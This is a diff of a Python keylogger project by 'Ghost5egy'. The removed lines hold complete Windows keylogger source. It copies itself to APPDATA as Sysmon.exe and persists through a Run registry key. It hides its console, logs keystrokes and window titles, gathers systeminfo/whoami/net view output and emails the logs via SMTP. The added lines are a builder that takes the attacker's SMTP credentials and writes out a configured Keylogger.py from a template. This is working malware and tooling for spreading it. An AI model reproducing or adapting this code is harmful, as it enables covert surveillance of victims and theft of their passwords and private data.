@@ -1,103 +1,58 @@
-import win32gui as wg
-import win32console as wc
-import pynput.keyboard
-import threading as thread5
-import time 
-import sys,os
-import shutil
-from smtplib import SMTP
-import email.message
+import sys
 
-currentkey = ''
-logdata = ''
-timereport = time.ctime()
-firstreport = 0
+def getfcontent(file):
+		filedata = ''
+		with open(file) as f :
+			filedata = f.read()
+		return filedata
 
-def startup():
-	dirapp = os.path.expanduser(os.getenv("APPDATA")) + "\\Sysmon.exe"
-	if not os.path.exists(dirapp): 
-		shutil.copy2(sys.argv[0] , dirapp);
-	
-	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Gkeylogger"').read()
-	if regquery.find(dirapp) < 0:
-		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Gkeylogger" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
-		#os.popen("cmd.exe /c " + dirapp)
+def writefcontent(file,filedata):
+		with open(file,'w') as f :
+			state = f.write(filedata)
+		return state
 
-def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
-	global logdata,timereport,interval,firstreport
-	if firstreport == 0 :
-		logdata = os.popen('systeminfo & whoami & net view').read()
-		firstreport = 1
-	timereport = time.ctime()
+def main(argv):
+	W  = '\033[0m'  # white (normal)
+	R  = '\033[31m' # red
+	G  = '\033[32m' # green
+	O  = '\033[33m' # orange
+	B  = '\033[34m' # blue
+	P  = '\033[35m' # purple
+	print('\t{}Welcome to mail sender framework ......{}'.format(G,G))
+	print('\t{}you can use this framework for creating GKeyLogger \nCoded By : Ghost5egy{}'.format(R,R))
+	print('\t{}1- Email Notification . {}'.format(O,O))
+	print('\t{}2- WebSocket Notification . {}'.format(O,O))    
+	sendtype = -1
 	while True:
-		#print(logdata)
-		if len(logdata) > 30 :
-			msg = logdata
-			logdata = ''
-			sendmailg(gserver , gport , guser, gpass , mailfrom , mailto , subject ,msg , 0)
-		time.sleep(60 * interval)
-
-def onpressevent(key):
-	global currentkey
-	global logdata
-	try :
-		logdata = logdata + key.char
-	except AttributeError :
-		logdata = logdata + " " + str(key) + " "
-
-def Checkifwindowchanged():
-	global logdata
-	if sys.platform in ['Windows' , 'win32']:
-		cwindow = 'none'
-		while True:
-			activewindow = wg.GetWindowText(wg.GetForegroundWindow())
-			if cwindow != activewindow :
-				cwindow = activewindow
-				logdata = logdata + '\n' + cwindow + " "+time.ctime() + '\n'
- 
-def startkeylogger():  
-	kbdlisten = pynput.keyboard.Listener(on_press=onpressevent)
-	with kbdlisten :
-		kbdlisten.join()
-
-def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
-	wg.ShowWindow(wc.GetConsoleWindow(),0);
-	startup()
-	wtthread = thread5.Thread(target=Checkifwindowchanged)
-	kthread = thread5.Thread(target=startkeylogger)
-	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto, subject))
-	kthread.start()
-	wtthread.start()
-	mailthread.start()
-	kthread.join()
-	wtthread.join()
-	mailthread.join()
-
-def sendmailg(gserver , gport ,guser, gpass , mailfrom , mailto , subject , msg , ishtml = 0):
-	mailmsg = email.message.Message()
-	mailmsg['From'] = mailfrom
-	mailmsg['To'] = mailto
-	mailmsg['Subject'] = subject
-
-	if ishtml == 1:
-		mailmsg.add_header('Content-Type','text/html')
+		sendtype = int(input('\t{0}Enter Your choice : {1}'.format(B,B)))
+		if sendtype > 2 or sendtype < 0 :
+			print('{}\tYou Entered a wrong choice please insert a valid one .{}'.format(R,R))
+		else:
+			if sendtype == 1:
+				print('{}\tyou choosed {} then you want use email Notification{}'.format(R,sendtype,R))
+			else:
+				print('{}\tyou choosed {} then you want Use Websocket Notification{}'.format(R,sendtype,R))
+			break
+	if sendtype == 1:
+		gserver = input('\t{0}Enter The Smtp Server : {1}'.format(B,B))
+		gport = int(input('\t{0}Enter The Smtp port : {1}'.format(B,B)))
+		guser = input('\t{0}Enter The Smtp User : {1}'.format(B,B))
+		gpass = input('\t{0}Enter The Smtp password : {1}'.format(B,B))
+		mailfrom = input('\t{0}Enter The sender email : {1}'.format(B,B))
+		mailto = input('\t{0}Enter The reciver email : {1}'.format(B,B))
+		subject = input('\t{0}Enter The Subject for report mail : {1}'.format(B,B))
+		reportduration = input('\t{0}Enter The duration that you revecive report email in minutes : {1}'.format(B,B))
+		keyconn = "interval=" + reportduration + "\nrunobjects('" + gserver + "' , '" + str(gport) + "' , '" + guser + "' , '" + gpass + "' , '" + mailfrom + "' , '" + mailto + "' , '" + subject + "')"
+		klgstr = getfcontent("templates/Gkeyloggertemplate.py")
+		klgstr += keyconn
+		writefcontent("Keylogger.py",klgstr)
+		print(getfcontent("Keylogger.py"))
+		if sys.platform == "win32":
+			print("pyinstaller for windows")
+		else:
+			print("pyinstaller for wine")
 	else:
-		mailmsg.add_header('Content-Type','text/plain')
+		print('Not implemented yet')
 
-	mailmsg.set_payload (msg, 'utf-8')
-	with SMTP(gserver , gport)  as smtp:
-		smtp.ehlo()
-		smtp.starttls()
-		smtp.login(guser, gpass)
-		smtp.sendmail(mailfrom, mailto,mailmsg.as_string())
-		smtp.quit()
-
-interval = 2
-gserver = ''
-gport = ''
-guser = ''
-gpass = ''
-mailfrom = ''
-mailto = ''
-subject = ''
-runobjects(gserver , gport , guser , gpass , mailfrom,  mailto, subject)
+if __name__ == "__main__":
+	main(sys.argv[1:])
